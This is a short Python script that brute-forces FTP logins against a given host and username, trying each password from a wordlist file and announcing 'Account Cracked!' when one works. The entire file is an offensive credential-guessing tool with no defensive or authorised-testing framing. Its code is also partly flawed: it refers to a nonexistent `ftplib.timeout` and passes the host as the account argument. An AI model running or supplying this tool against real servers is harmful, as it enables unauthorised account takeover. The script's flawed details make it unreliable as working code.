import socket
import sys
import ftplib
from ftplib import FTP 
class colors():
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
def main_(host,user,passfile):
	with open(passfile, 'r') as file:
		print("[FTP] Cracking {} | User: {} | Password list: {}".format(host,user, passfile), colors.WARNING + "[!]", colors.ENDC)
		for lines in file:
			try:
				exc_r = ftplib.error_perm
				exc_t = ftplib.timeout
				pass_words = lines.strip()
				ftpcrack = FTP(host)
				ftpcrack.login(user,pass_words,host)
				print("Account Cracked! | Host: {} | User: {} |  Password: {}".format(host, user,pass_words), colors.OKGREEN + "[OK]", colors.ENDC)
			except KeyboardInterrupt:
				sys.exit(1)
			except ConnectionRefusedError:
				print("Connection unaviliable...", colors.FAIL + "[x]", colors.ENDC)
				sys.exit(1)
			except exc_r:
				print("Account Login Failure! Host: {} | User: {} | Password: {}".format(host, user, pass_words), colors.FAIL + "[x]", colors.ENDC)
				pass 
			except exc_t:
				print("Timeout error ", colors.FAIL + "[x]", colors.ENDC)
def main():
	try:	
		host = sys.argv[1]
		user = sys.argv[2]
		passfile = sys.argv[3]
		main_(host,user,passfile)
	except KeyboardInterrupt:
		sys.exit(1)
	except IndexError:
		print("\nUsage: ")
		print("python3 {} <ip> <user> <passfile> ".format(sys.argv[0]))
main()

